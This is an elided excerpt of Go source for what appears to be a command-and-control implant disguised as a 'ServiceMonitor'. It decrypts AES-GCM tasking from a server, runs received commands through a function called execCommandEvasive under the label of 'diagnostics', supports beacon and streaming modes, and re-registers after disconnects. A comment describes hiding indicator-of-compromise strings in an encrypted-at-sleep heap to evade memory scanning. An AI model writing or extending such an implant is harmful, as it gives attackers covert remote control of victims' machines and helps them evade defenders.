...
func (sm *ServiceMonitor) decryptPayload(encoded string) ([]byte, error) {
	...
	if len(raw) < 32 || string(raw[:4]) != "AES1" {
		return nil, fmt.Errorf("invalid AES-GCM payload")
	}
	key := deriveAuthKey(configAuthToken)
	block, err := aes.NewCipher(key)
	if err != nil {
...
func (sm *ServiceMonitor) resolveMode() string {
	m := agentMode
	if m == "" || m == "{{AGENT_MODE}}" {
		m = "beacon"
	}
...
func (sm *ServiceMonitor) runDiagnostic(checkName string) DiagnosticResult {
	...
	var output []byte
	var err error
	output, err = execCommandEvasive(checkName)
...
func (sm *ServiceMonitor) processTasks(tasks []map[string]interface{}) []map[string]interface{} {
	...
	for _, task := range tasks {
		...
		if commandID, ok := task["command_id"].(string); ok && commandID != "" {
...
func main() {
	...
	// Move IoC strings into encrypted-at-sleep heap
	storeSensitive([]byte(configAuthToken))
	storeSensitive([]byte(configEndpoint))
	storeSensitive([]byte(configProtocol + "://" + configEndpoint + ":" + configPort))
	...
	transport := NewActiveTransport(
		...
		func(s string) (string, error) { return svc.encryptPayload([]byte(s)) },
		func(s string) (string, error) {
			dec, err := svc.decryptPayload(s)
			if err != nil {
				return "", err
			}
	...
	if mode == "streaming" {
		...
		for {
			...
			// StartStreaming returned — try re-registering
			newID, err := transport.Register(meta)
			if err != nil {
